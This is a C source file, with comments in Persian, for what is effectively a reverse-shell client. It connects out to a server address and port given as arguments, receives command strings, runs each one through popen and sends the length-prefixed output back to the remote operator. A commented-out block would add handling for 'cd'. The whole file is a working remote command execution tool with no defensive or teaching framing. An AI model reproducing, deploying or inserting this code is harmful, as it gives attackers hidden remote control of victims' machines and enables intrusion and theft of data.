#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>



// یک شرط برای هندل کردن دستور cd زده ام که الان کامنت شده است و در صورت نیاز میشود آن را از کامنت خارج کرد.

#define BUFFER_SIZE 4096

int main(int argc, char *argv[]) 
{
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    if (argc != 3) 
    {
        printf("Usage: %s <server_ip> <port>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

    while (1) 
    {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytes <= 0) break;

        // حذف newline
        buffer[strcspn(buffer, "\n")] = 0;

        // هندل cd
        // if (strncmp(buffer, "cd ", 3) == 0) {
        //     chdir(buffer + 3);
        //     int len = htonl(0);
        //     send(sock, &len, sizeof(int), 0);
        //     continue;
        // }

        // اجرای دستور
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) 
        {
            char *err = "Command failed\n";
            int len = htonl(strlen(err));
            send(sock, &len, sizeof(int), 0);
            send(sock, err, strlen(err), 0);
            continue;
        }

        char *output = NULL;
        size_t total_size = 0;

        while (fgets(buffer, BUFFER_SIZE, fp) != NULL) 
        {
            size_t len = strlen(buffer);
            output = realloc(output, total_size + len);
            memcpy(output + total_size, buffer, len);
            total_size += len;
        }

        pclose(fp);

        // ارسال طول
        int net_len = htonl(total_size);
        send(sock, &net_len, sizeof(int), 0);

        // ارسال داده
        if (total_size > 0)
        {
            send(sock, output, total_size, 0);
        }
        free(output);
    }
    close(sock);
    return 0;
}